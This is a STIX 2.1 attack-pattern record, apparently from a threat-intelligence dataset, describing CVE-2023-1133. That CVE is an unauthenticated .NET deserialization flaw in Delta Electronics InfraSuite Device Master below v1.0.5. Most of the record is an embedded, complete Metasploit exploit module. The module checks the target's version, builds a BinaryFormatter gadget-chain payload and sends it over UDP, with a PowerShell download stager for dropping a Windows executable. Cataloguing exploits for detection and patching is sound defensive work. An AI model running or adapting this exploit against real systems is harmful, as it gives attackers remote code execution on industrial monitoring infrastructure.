{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9daa707d-edd3-40eb-b814-39701cee5803",
    "created": "2024-08-14T16:46:04.334955Z",
    "modified": "2024-08-14T16:46:04.334959Z",
    "name": "Delta Electronics InfraSuite Device Master Deserialization",
    "description": " Delta Electronics InfraSuite Device Master versions below v1.0.5 have an unauthenticated .NET deserialization vulnerability within the 'ParseUDPPacket()' method of the 'Device-Gateway-Status' process.  The 'ParseUDPPacket()' method reads user-controlled packet data and eventually calls 'BinaryFormatter.Deserialize()' on what it determines to be the packet header without appropriate validation leading to unauthenticated code execution as the user running the 'Device-Gateway-Status' process. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/delta_electronics_infrasuite_deserialization.rb",
            "external_id": "delta_electronics_infrasuite_deserialization.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-1133"
        },
        {
            "source_name": "reference",
            "url": "https://www.zerodayinitiative.com/advisories/ZDI-23-672/"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/owl4Xz8fKW/cve-2023-1133"
        }
    ],
    "x_code_snippet": "# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::Udp\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Delta Electronics InfraSuite Device Master Deserialization',\n        'Description' => %q{\n          Delta Electronics InfraSuite Device Master versions below v1.0.5 have an\n          unauthenticated .NET deserialization vulnerability within the 'ParseUDPPacket()'\n          method of the 'Device-Gateway-Status' process.\n\n          The 'ParseUDPPacket()' method reads user-controlled packet data and eventually\n          calls 'BinaryFormatter.Deserialize()' on what it determines to be the packet header without appropriate validation,\n          leading to unauthenticated code execution as the user running the 'Device-Gateway-Status' process.\n        },\n        'Author' => [\n          'Anonymous', # Vulnerability discovery\n          'Shelby Pace' # Metasploit module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2023-1133'],\n          ['URL', 'https://www.zerodayinitiative.com/advisories/ZDI-23-672/'],\n          ['URL', 'https://attackerkb.com/topics/owl4Xz8fKW/cve-2023-1133']\n        ],\n        'Platform' => 'win',\n        'Privileged' => false,\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Targets' => [\n          [\n            'Windows EXE Dropper',\n            {\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :windows_dropper,\n              'CmdStagerFlavor' => :psh_invokewebrequest\n            }\n          ],\n          [\n            'Windows CMD',\n            {\n              'Arch' => [ARCH_CMD],\n              'Type' => :windows_cmd\n            }\n          ],\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2023-05-17',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS, SCREEN_EFFECTS],\n          'Reliability' => [REPEATABLE_SESSION]\n        }\n      )\n    )\n\n    register_options([\n      Opt::RPORT(10100),\n      OptInt.new('INFRASUITE_PORT', [ true, 'The port on which the InfraSuite Manager is listening', 80 ]),\n      OptString.new('TARGETURI', [ true, 'The base path to the InfraSuite Manager', '/' ])\n    ])\n  end\n\n  def check\n    print_status('Requesting the login page to determine if target is InfraSuite Device Master...')\n    res = send_request_cgi(\n      'method' => 'GET',\n      'rport' => datastore['INFRASUITE_PORT'],\n      'uri' => normalize_uri(target_uri.path, 'login.html')\n    )\n\n    return CheckCode::Unknown unless res\n\n    unless res.body.include?('InfraSuite Manager Login')\n      return CheckCode::Safe('Target does not appear to be InfraSuite Device Master.')\n    end\n\n    print_status('Target is InfraSuite Device Master. Now attempting to determine version.')\n    res = send_request_cgi(\n      'method' => 'GET',\n      'rport' => datastore['INFRASUITE_PORT'],\n      'uri' => normalize_uri(target_uri.path, 'js/webcfg.js')\n    )\n\n    unless res&.body&.include?('var devicemasterCfg')\n      return CheckCode::Detected('Discovered InfraSuite Device Master, but couldn\\'t determine version.')\n    end\n\n    version = res.body.match(/version:'(\\d+(?:\\.\\d+)+[a-zA-Z]?)'/)\n    unless version && version.length > 1\n      return CheckCode::Detected('Failed to find version string')\n    end\n\n    version = version[1]\n    vprint_status(\"Found version '#{version}' of InfraSuite Device Master\")\n    r_vers = Rex::Version.new(version)\n\n    return CheckCode::Appears if r_vers < Rex::Version.new('1.0.5')\n\n    CheckCode::Safe\n  end\n\n  def exploit\n    connect_udp\n    case target['Type']\n    when :windows_dropper\n      execute_cmdstager\n    when :windows_cmd\n      execute_command(payload.encoded)\n    end\n  end\n\n  def execute_command(cmd, _opts = {})\n    serialized = ::Msf::Util::DotNetDeserialization.generate(\n      cmd,\n      gadget_chain: :ClaimsPrincipal,\n      formatter: :BinaryFormatter\n    )\n\n    pkt = \"\\x01#{[ serialized.length ].pack('n')}#{serialized}\"\n    udp_sock.put(pkt)\n  end\n\n  def cleanup\n    disconnect_udp\n  end\nend\n",
    "x_mitre_disclosure_date": "2023-05-17",
    "x_mitre_platforms": [
        "win'"
    ]
}